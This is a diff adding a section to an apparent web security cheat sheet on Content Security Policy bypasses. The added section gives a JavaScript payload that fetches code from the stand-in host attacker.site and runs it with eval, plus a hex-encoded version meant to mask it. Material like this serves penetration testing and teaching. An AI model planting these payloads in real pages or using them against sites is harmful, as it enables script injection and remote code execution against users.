@@ -387,6 +387,16 @@ Overly permissive CSP headers, such as those allowing unsafe-inline, can be expl
 Inline Script Allowances
 When unsafe-inline is allowed, or if there is an oversight allowing inline scripts, attackers can inject their payload directly into inline scripts.
 
+Bypass script src policy using fetch  
+if we want to execute javascript from a remote resource but the CSP does not allow it we can use a combination of fetch and eval as a workaround
+```
+Function("fetch('http://attacker.site/payload').then(response=>response.text()).then(text=>{eval(text)})")() 
+```
+this could be further masked by breaking it up or using different encoding methods like hex
+```
+Function('\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x61\x74\x74\x61\x63\x6b\x65\x72\x2e\x73\x69\x74\x65\x2f\x70\x61\x79\x6c\x6f\x61\x64\x27\x29\x2e\x74\x68\x65\x6e\x28\x72\x65\x73\x70\x6f\x6e\x73\x65\x3d\x3e\x72\x65\x73\x70\x6f\x6e\x73\x65\x2e\x74\x65\x78\x74\x28\x29\x29\x2e\x74\x68\x65\x6e\x28\x74\x65\x78\x74\x3d\x3e\x7b\x65\x76\x61\x6c\x28\x74\x65\x78\x74\x29\x7d\x29')()
+```
+
 Data URIs
 Data URIs can sometimes be used to bypass CSP if they are allowed in the policy.
 ```
